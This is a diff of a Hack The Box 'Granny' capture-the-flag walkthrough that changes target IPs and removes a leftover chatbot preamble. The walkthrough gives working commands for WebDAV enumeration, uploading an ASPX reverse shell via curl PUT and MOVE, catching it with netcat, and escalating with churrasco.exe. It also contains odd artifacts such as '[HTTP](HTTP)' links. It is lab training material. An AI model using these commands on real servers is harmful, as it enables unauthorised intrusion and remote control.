@@ -1,7 +1,4 @@
-Absolutely! Here’s your clean, markdown-formatted walkthrough for **HTB: Granny**, with all [HTTP](HTTP) references properly hyperlinked and grouped by stage:
-
----
-
+[Done](Done)
 # 👵 HTB: Granny – Walkthrough
 
 **Machine Info:**
@@ -19,13 +16,13 @@ Absolutely! Here’s your clean, markdown-formatted walkthrough for **HTB: Grann
 
 ### 🔎 Fast Port Scan
 ```bash
-nmap -p- -T5 10.129.83.212
+nmap -p- -T5 10.10.10.15
 ```
 Only **port 80 ([HTTP](HTTP))** is open.
 
 ### 📌 Service Enumeration
 ```bash
-nmap -p 80 -A 10.129.83.212 -v
+nmap -p 80 -A 10.10.10.15 -v
 ```
 - **Service**: Microsoft IIS httpd 6.0
 - **Extensions**: WebDAV (with support for `PUT`, `MOVE`, `PROPFIND`, etc.)
@@ -36,7 +33,7 @@ nmap -p 80 -A 10.129.83.212 -v
 
 ### 🛠️ Check WebDAV Methods
 ```bash
-davtest -url http://10.129.83.212
+davtest -url http://10.10.10.15
 ```
 
 Result:
@@ -59,12 +56,12 @@ mv shell.aspx shell.txt
 
 ### 2️⃣ Upload Using [HTTP](HTTP) `PUT`
 ```bash
-curl -X PUT http://10.129.83.212/shell.txt --data-binary @shell.txt
+curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt
 ```
 
 ### 3️⃣ Rename Using [HTTP](HTTP) `MOVE`
 ```bash
-curl -X MOVE --header 'Destination:http://10.129.83.212/shell.aspx' http://10.129.83.212/shell.txt
+curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
 ```
 
 ### 4️⃣ Start Listener
@@ -75,7 +72,7 @@ nc -nvlp 4444
 ### 5️⃣ Trigger Shell
 Visit in browser:
 ```
-http://10.129.83.212/shell.aspx
+http://10.10.10.15/shell.aspx
 ```
 
 ---
@@ -105,7 +102,7 @@ mv churrasco.exe churrasco.txt
 
 ### 3️⃣ Upload via [HTTP](HTTP)
 ```bash
-curl -X PUT http://10.129.83.212/churrasco.txt --data-binary @churrasco.txt
+curl -X PUT http://10.10.10.15/churrasco.txt --data-binary @churrasco.txt
 ```
 
 ### 4️⃣ Rename in Shell
@@ -117,7 +114,7 @@ ren churrasco.txt churrasco.exe
 ```bash
 cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop
 mv nc.exe nc.txt
-curl -X PUT http://10.129.83.212/nc.txt --data-binary @nc.txt
+curl -X PUT http://10.10.10.15/nc.txt --data-binary @nc.txt
 ren nc.txt nc.exe
 ```
 
